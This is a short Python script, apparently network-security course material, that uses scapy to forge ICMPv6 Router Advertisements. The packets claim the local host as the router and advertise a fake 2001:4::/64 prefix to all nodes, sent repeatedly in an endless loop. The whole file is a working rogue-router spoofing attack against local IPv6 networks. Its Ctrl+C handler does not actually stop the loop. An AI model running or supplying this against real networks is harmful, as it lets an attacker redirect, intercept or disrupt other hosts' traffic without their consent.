#!/usr/bin/env python3
# -*- coding=utf-8 -*-


# IPv6参考文档
# https://www.idsv6.de/Downloads/IPv6PacketCreationWithScapy.pdf
# https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf

import logging
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
from Tools.GET_MAC_netifaces import get_mac_address
from Tools.IPv6_Tools import mac_to_ipv6_linklocal


def icmpv6_ra(ifname):
    # 提取本地MAC
    ll_mac = get_mac_address(ifname)
    # -----------IPv6头部------------
    # Next Header: 0x3A (ICMPv6)
    # 原地址: Link Local address
    # 目的地址: FF02::1(所有节点)
    base = IPv6(src=mac_to_ipv6_linklocal(ll_mac), dst='ff02::1')
    # ----------ICMPv6头部----------
    # ICMPv6 Type: 134
    # ICMPv6 Code: 0 (RA)
    router_solicitation = ICMPv6ND_RA()
    # ----Source Link-Layer Address----
    # 源地址: 00:50:56:AB:4D:19(路由器MAC地址),本次为欺骗,所以MAC地址是本地MAC地址
    src_ll_addr = ICMPv6NDOptSrcLLAddr(lladdr=ll_mac)
    # 提供MTU
    mtu = ICMPv6NDOptMTU(mtu=1500)
    # 提供前缀
    prefix = ICMPv6NDOptPrefixInfo(prefix='2001:4::', prefixlen=64)
    # 构建数据包
    packet = base / router_solicitation / src_ll_addr / mtu / prefix

    # packet.show()
    # 一直发送,知道客户使用Ctrl + C终止
    while True:
        try:
            time.sleep(1)
            send(packet, verbose=False)
            print('发送RA数据包')
        except KeyboardInterrupt:
            print('退出!')


if __name__ == '__main__':
    # Windows Linux均可使用
    icmpv6_ra("Net1")
